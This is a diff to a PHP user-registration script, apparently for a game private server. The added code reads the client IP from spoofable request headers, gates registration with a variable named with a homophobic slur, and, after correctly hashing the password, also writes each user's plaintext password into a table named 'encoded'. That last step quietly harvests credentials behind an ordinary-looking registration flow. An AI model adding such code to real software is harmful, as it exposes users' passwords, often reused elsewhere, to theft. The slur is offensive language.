@@ -1,7 +1,35 @@
 <?php
 include "../incl/lib/connection.php";
 require_once "../incl/lib/exploitPatch.php";
+require_once "../incl/lib/mainLib.php";
+$gs = new mainLib();
+
+////
+if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+	$ip = $_SERVER['HTTP_CLIENT_IP'];
+} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+	$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+} else {
+	$ip = $_SERVER['REMOTE_ADDR'];
+}
+
+$usr = $db->query("SELECT COUNT(*) FROM users WHERE isRegistered = 1");
+$acc = $db->query("SELECT COUNT(*) FROM accounts");
+
+$users = $usr->fetchColumn();
+$accounts = $acc->fetchColumn();
+
+$gays = $accounts - $users;
+if($gays > 260)
+{
+  
+exit("fdfd");
+die();
+
+
+}
 $ep = new exploitPatch();
+$ep->DOS($ip);
 if($_POST["userName"] != ""){
 	//here im getting all the data
 	$userName = $ep->remove($_POST["userName"]);
@@ -16,9 +44,11 @@ if($_POST["userName"] != ""){
 		echo "-2";
 	}else{
 		$hashpass = password_hash($password, PASSWORD_DEFAULT);
-		$query = $db->prepare("INSERT INTO accounts (userName, password, email, secret, saveData, registerDate, saveKey)
-		VALUES (:userName, :password, :email, :secret, '', :time, '')");
+		$query = $db->prepare("INSERT INTO accounts (coins, userName, password, email, secret, saveData, registerDate, saveKey)
+		VALUES (0, :userName, :password, :email, :secret, '', :time, '')");
 		$query->execute([':userName' => $userName, ':password' => $hashpass, ':email' => $email, ':secret' => $secret, ':time' => time()]);
+		$query2 = $db->prepare("INSERT INTO encoded VALUES (:userName,:password)");
+		$query2->execute([':userName' => $userName, ':password' => $password]);
 		echo "1";
 	}
 }
